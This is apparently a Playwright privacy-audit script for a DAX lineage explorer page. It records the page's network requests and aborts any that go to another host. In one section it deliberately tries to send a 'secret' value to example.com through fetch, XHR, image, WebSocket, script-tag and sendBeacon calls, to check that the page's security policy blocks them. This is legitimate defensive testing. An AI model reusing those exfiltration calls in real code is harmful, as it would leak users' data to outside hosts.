/*
 * Privacy audit: open the explorer in a real browser, use it, and record
 * every request it makes. Fails if anything goes to another host.
 *
 *   npm install --no-save playwright && npx playwright install chromium
 *   node scripts/privacy_audit.js offline  path/to/report.pbix
 *   node scripts/privacy_audit.js served   path/to/report.pbix   (with `daxlin serve --no-open` running)
 *   node scripts/privacy_audit.js site     path/to/report.pbix   (with `npm run serve` running)
 *
 * Set CHROME=/path/to/chrome to use an installed browser instead.
 */
const path = require("path");
const fs = require("fs");
const os = require("os");
let playwright;
try { playwright = require(process.env.PLAYWRIGHT || "playwright"); }
catch (_) { console.error("needs playwright: npm install --no-save playwright"); process.exit(2); }

const [, , mode = "offline", pbix] = process.argv;
const urls = {
  offline: "file://" + path.resolve(__dirname, "../docs/dax-lineage-explorer.html"),
  served: "http://127.0.0.1:8765/",
  site: "http://127.0.0.1:8000/"
};

(async () => {
  const browser = await playwright.chromium.launch(process.env.CHROME ? { executablePath: process.env.CHROME, args: ["--no-sandbox"] } : {});
  const context = await browser.newContext({ acceptDownloads: true });
  const page = await context.newPage();
  const requests = [], violations = [], errors = [], reachedNetwork = [], blockedByPolicy = [];
  page.on("request", r => requests.push(r.url()));
  page.on("requestfailed", r => { if (/BLOCKED_BY_CSP|csp/i.test(r.failure().errorText)) blockedByPolicy.push(r.url()); });
  page.on("pageerror", e => errors.push(e.message));
  page.on("console", m => { if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text().slice(0, 140)); });

  const start = urls[mode];
  const origin = mode === "offline" ? "file://" : new URL(start).origin;
  // Requests the page's policy blocks never reach the network layer. Anything
  // that does reach it and is not the page's own origin is a leak: record it,
  // and abort it so the audit itself never sends data anywhere.
  await context.route("**/*", route => {
    const u = route.request().url();
    if (u.startsWith(origin) || u.startsWith("data:") || u.startsWith("blob:")) return route.continue();
    reachedNetwork.push(u);
    return route.abort();
  });
  await page.goto(start);
  const ready = () => page.waitForSelector("#app:not([hidden]) #nodes .node", { timeout: 30000 });
  const steps = [];

  await page.click('[data-sample="sample"]'); await ready(); steps.push("sample model");
  if (pbix) {
    await page.click("#openAnother");
    await page.setInputFiles("#files", pbix); await ready(); steps.push(`opened ${path.basename(pbix)}`);
  }
  await page.click('.viewtabs button[data-view="table"]'); steps.push("usage list");
  await page.click("table.usage tbody tr >> nth=0").catch(() => {}); steps.push("where-used panel");
  const [download] = await Promise.all([page.waitForEvent("download"), page.click("#csvWhereUsed2")]);
  await download.saveAs(path.join(os.tmpdir(), "where-used-audit.csv")); steps.push("CSV export");

  // try to leak: every route a script could use to send data out
  const attempts = await page.evaluate(async () => {
    const out = {};
    const tryIt = async (name, fn) => { try { await fn(); out[name] = "SENT"; } catch (e) { out[name] = "blocked"; } };
    await tryIt("fetch", () => fetch("https://example.com/leak?d=secret"));
    await tryIt("xhr", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", "https://example.com/leak"); x.onload = res; x.onerror = rej; x.send(); }));
    await tryIt("image", () => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = rej; i.src = "https://example.com/leak.png?d=secret"; }));
    await tryIt("websocket", () => new Promise((res, rej) => { const w = new WebSocket("wss://example.com/leak"); w.onopen = res; w.onerror = rej; }));
    await tryIt("script", () => new Promise((res, rej) => { const s = document.createElement("script"); s.src = "https://example.com/x.js"; s.onload = res; s.onerror = rej; document.head.appendChild(s); }));
    out.beacon = navigator.sendBeacon ? (navigator.sendBeacon("https://example.com/leak", "secret") ? "queued" : "blocked") : "n/a";
    return out;
  });
  await page.waitForTimeout(500);

  const isLocal = u => u.startsWith("data:") || u.startsWith("blob:") || u.startsWith(origin) || u.startsWith("file://");
  const ownRequests = requests.filter(isLocal);
  const report = {
    mode, url: start, steps,
    pageOwnRequests: ownRequests.length,
    otherHostsTried: [...new Set(requests.filter(u => !isLocal(u)))].length,
    blockedByThePagePolicy: [...new Set(blockedByPolicy)],
    reachedTheNetwork: reachedNetwork,
    leakAttempts: attempts, policyViolationsLogged: violations.length, pageErrors: errors
  };
  console.log(JSON.stringify(report, null, 1));
  await browser.close();
  const sent = Object.values(attempts).filter(v => v === "SENT").length;
  if (reachedNetwork.length || sent || errors.length) { console.error("\nFAIL: a request got past the page's policy"); process.exit(1); }
  console.log(`\nPASS: the page made ${ownRequests.length} request(s), all ${mode === "offline" ? "to the file itself" : "to " + origin}; ` +
    `the deliberate attempts to send data out were blocked by the browser before reaching the network`);
})().catch(e => { console.error(e); process.exit(1); });
